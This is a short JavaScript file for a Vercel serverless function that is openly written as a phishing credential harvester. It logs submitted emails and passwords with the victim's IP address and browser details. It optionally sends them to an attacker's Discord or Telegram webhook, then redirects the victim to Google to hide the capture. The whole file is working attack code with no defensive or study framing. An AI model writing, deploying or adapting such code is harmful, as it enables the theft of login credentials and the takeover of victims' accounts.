// Vercel Serverless Function to capture credentials
export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { email, password, remember } = req.body;
  
  // Log to Vercel logs (you can see in dashboard)
  console.log('=== CAPTURED CREDENTIALS ===');
  console.log('Email:', email);
  console.log('Password:', password);
  console.log('Remember:', remember);
  console.log('IP:', req.headers['x-forwarded-for'] || req.connection.remoteAddress);
  console.log('User-Agent:', req.headers['user-agent']);
  console.log('Time:', new Date().toISOString());
  console.log('===========================');

  // Send to webhook (optional - you can add your Discord/Telegram webhook)
  const webhookUrl = process.env.WEBHOOK_URL;
  if (webhookUrl) {
    try {
      await fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: `**New Capture**\n📧 Email: ${email}\n🔑 Password: ${password}\n🌐 IP: ${req.headers['x-forwarded-for']}\n⏰ Time: ${new Date().toISOString()}`
        })
      });
    } catch (e) {
      console.error('Webhook failed:', e);
    }
  }

  // Redirect to Google (or any site)
  res.redirect(302, 'https://google.com');
}
